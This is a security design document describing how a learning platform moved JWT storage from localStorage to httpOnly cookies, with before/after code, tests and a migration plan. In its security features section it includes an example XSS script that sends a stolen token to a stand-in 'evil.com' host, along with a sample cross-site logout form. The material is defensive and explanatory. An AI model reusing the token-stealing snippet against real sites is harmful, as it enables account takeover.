# httpOnly Cookie Authentication - Security Implementation

## Overview

This document describes the implementation of httpOnly cookie authentication to eliminate XSS vulnerabilities in the OpenLearn platform.

## Problem Statement

**Original Vulnerability:**
- JWT tokens were stored in `localStorage`
- Any XSS attack could execute: `localStorage.getItem('access_token')`
- Stolen tokens could be used to impersonate users

**Risk Level:** **HIGH** - Complete account takeover possible

## Solution Implemented

**httpOnly Cookie Authentication:**
- Tokens stored in httpOnly cookies (inaccessible to JavaScript)
- SameSite=Strict for CSRF protection
- Secure flag for HTTPS-only transmission (production)
- Automatic cookie rotation on refresh

## Architecture

### Backend Changes

#### 1. Login Endpoint (`/api/v1/auth/token`)

**Before:**
```python
return TokenResponse(
    access_token=access_token,
    refresh_token=refresh_token,
    user=user
)
```

**After:**
```python
# Set httpOnly cookies
response.set_cookie(
    key="access_token",
    value=access_token,
    httponly=True,         # XSS protection
    secure=True,           # HTTPS only (production)
    samesite="strict",     # CSRF protection
    max_age=1800,          # 30 minutes
    path="/"
)

response.set_cookie(
    key="refresh_token",
    value=refresh_token,
    httponly=True,
    secure=True,
    samesite="strict",
    max_age=604800,        # 7 days
    path="/api/v1/auth/refresh"  # Limited scope
)

# Still return tokens in body for backward compatibility
return TokenResponse(...)
```

#### 2. Authentication Middleware (`get_current_user`)

**Before:**
```python
async def get_current_user(
    token: str = Depends(oauth2_scheme),
    db: Session = Depends(get_db)
):
    # Only checked Authorization header
    payload = verify_token(token)
    ...
```

**After:**
```python
async def get_current_user(
    request: Request,
    db: Session = Depends(get_db),
    token: Optional[str] = Depends(oauth2_scheme)
):
    # Check cookie first (secure method)
    token_value = request.cookies.get("access_token")

    # Fallback to header (backward compatibility)
    if not token_value and token:
        token_value = token

    payload = verify_token(token_value)
    ...
```

#### 3. Refresh Endpoint (`/api/v1/auth/refresh`)

**Before:**
```python
async def refresh_access_token(
    request: RefreshTokenRequest,
    db: Session = Depends(get_db)
):
    refresh_token = request.refresh_token  # From request body
    ...
```

**After:**
```python
async def refresh_access_token(
    request_obj: Request,
    response: Response,
    request: RefreshTokenRequest = None,
    db: Session = Depends(get_db)
):
    # Read from cookie first
    refresh_token_value = request_obj.cookies.get("refresh_token")

    # Fallback to body (backward compatibility)
    if not refresh_token_value and request:
        refresh_token_value = request.refresh_token

    # Set new cookies in response
    response.set_cookie(...)
    ...
```

#### 4. Logout Endpoint (`/api/v1/auth/logout`)

**Before:**
```python
async def logout(...):
    # Only cleared refresh_token in database
    current_user.refresh_token = None
    db.commit()
```

**After:**
```python
async def logout(
    response: Response,
    ...
):
    # Clear database
    current_user.refresh_token = None
    db.commit()

    # Clear cookies
    response.delete_cookie("access_token", path="/")
    response.delete_cookie("refresh_token", path="/api/v1/auth/refresh")
```

### Frontend Changes

#### 1. Login (`useAuth.tsx`)

**Before:**
```typescript
const response = await fetch('/api/v1/auth/token', {
    method: 'POST',
    body: formData
})

const data = await response.json()

// VULNERABLE: Stored in localStorage
localStorage.setItem('access_token', data.access_token)
localStorage.setItem('refresh_token', data.refresh_token)
```

**After:**
```typescript
const response = await fetch('/api/v1/auth/token', {
    method: 'POST',
    credentials: 'include',  // Send cookies
    body: formData
})

const data = await response.json()

// NO localStorage storage!
// Cookies are automatically managed by browser
setUser(data.user)
```

#### 2. Authenticated Requests

**Before:**
```typescript
const token = localStorage.getItem('access_token')

await fetch('/api/v1/endpoint', {
    headers: {
        'Authorization': `Bearer ${token}`
    }
})
```

**After:**
```typescript
// No token retrieval needed!
await fetch('/api/v1/endpoint', {
    credentials: 'include'  // Cookies sent automatically
})
```

#### 3. Logout

**Before:**
```typescript
await fetch('/api/v1/auth/logout', {
    headers: {
        'Authorization': `Bearer ${localStorage.getItem('access_token')}`
    }
})

localStorage.removeItem('access_token')
localStorage.removeItem('refresh_token')
```

**After:**
```typescript
// Server clears cookies automatically
await fetch('/api/v1/auth/logout', {
    credentials: 'include'
})

// No localStorage to clear!
```

## Security Features

### 1. XSS Protection (httpOnly)

**Attack Scenario:**
```javascript
// Malicious script injected via XSS
<script>
    // Try to steal tokens
    const token = localStorage.getItem('access_token')
    fetch('https://evil.com/steal?token=' + token)
</script>
```

**With httpOnly Cookies:**
- `document.cookie` doesn't expose httpOnly cookies
- No tokens in `localStorage`
- Attack fails!

### 2. CSRF Protection (SameSite=Strict)

**Attack Scenario:**
```html
<!-- evil.com creates malicious form -->
<form action="https://openlearn.com/api/v1/auth/logout" method="POST">
    <input type="submit" value="Click me!">
</form>
```

**With SameSite=Strict:**
- Browser doesn't send cookies for cross-site requests
- User clicks button on evil.com
- No cookies sent to openlearn.com
- Attack fails!

### 3. HTTPS Protection (Secure flag)

**In Production:**
```python
secure=settings.ENVIRONMENT.lower() == "production"
```

- Cookies only sent over HTTPS
- Prevents man-in-the-middle attacks
- HTTP requests don't include cookies

### 4. Path Restrictions

**Refresh Token Limited Scope:**
```python
response.set_cookie(
    key="refresh_token",
    path="/api/v1/auth/refresh"  # ONLY sent to this endpoint
)
```

- Reduces attack surface
- Refresh token not sent to other endpoints
- Limits potential damage if XSS bypasses httpOnly (browser bug)

## Testing

### Manual Testing

```bash
# 1. Login and verify cookies
curl -c cookies.txt -X POST http://localhost:8002/api/v1/auth/token \
  -d "username=test@example.com&password=password"

# Check cookies file
cat cookies.txt | grep access_token
# Should show: HttpOnly flag

# 2. Authenticated request with cookie
curl -b cookies.txt http://localhost:8002/api/v1/auth/me

# 3. Logout and verify cookies cleared
curl -b cookies.txt -c cookies.txt -X POST \
  http://localhost:8002/api/v1/auth/logout

# Check cookies are deleted
cat cookies.txt
# Should show cookies with expiration in past
```

### Automated Tests

Run security tests:
```bash
# Backend tests
cd backend
pytest tests/test_auth_cookies.py -v

# Should see:
# ✅ test_login_sets_access_token_cookie
# ✅ test_login_cookie_has_httponly_flag
# ✅ test_login_cookie_has_samesite_strict
# ✅ test_tokens_not_accessible_via_javascript
# ✅ test_csrf_protection
```

### Browser DevTools Verification

1. Open browser DevTools (F12)
2. Login to application
3. Go to Application/Storage → Cookies
4. Verify cookies have:
   - ✅ HttpOnly: ✓
   - ✅ Secure: ✓ (in production)
   - ✅ SameSite: Strict

5. Go to Console and try:
   ```javascript
   document.cookie  // Should NOT show access_token or refresh_token
   localStorage.getItem('access_token')  // Should return null
   ```

## Migration Strategy

### Phase 1: Dual Mode (Current)
- ✅ Backend supports both cookies AND headers
- ✅ Frontend uses cookies
- ✅ Old clients still work with headers
- Duration: 2-4 weeks

### Phase 2: Cookie-Only (Future)
- Remove token from response body
- Only return user info
- Require cookies for all authentication
- Document breaking changes

### Phase 3: Cleanup (Optional)
- Remove header-based auth fallback
- Update documentation
- Remove backward compatibility code

## Backward Compatibility

**Current State:**
- Backend accepts tokens from cookies OR headers
- Frontend uses cookies only
- API clients using Authorization header still work

**Breaking Changes:**
- None (fully backward compatible)

**Deprecation Notice:**
- Authorization header support will be removed in v2.0
- All clients should migrate to cookie-based auth

## Performance Impact

**Pros:**
- No localStorage access (faster)
- Automatic cookie management (less code)
- Smaller request headers (cookies only sent to relevant paths)

**Cons:**
- Minimal: Cookie parsing overhead (< 1ms)
- CORS requires `credentials: 'include'` (already configured)

## Security Checklist

- [x] Tokens in httpOnly cookies
- [x] SameSite=Strict for CSRF protection
- [x] Secure flag in production
- [x] Short-lived access tokens (30 minutes)
- [x] Refresh token path restriction
- [x] Logout clears cookies
- [x] No tokens in localStorage
- [x] `credentials: 'include'` on all fetch calls
- [x] CORS allows credentials
- [x] Tests verify httpOnly flag
- [x] Tests verify SameSite flag
- [x] Documentation updated

## References

- [OWASP: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP: CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [RFC 6265: HTTP State Management Mechanism](https://www.rfc-editor.org/rfc/rfc6265)

## Contact

For security issues, contact: security@openlearn.com
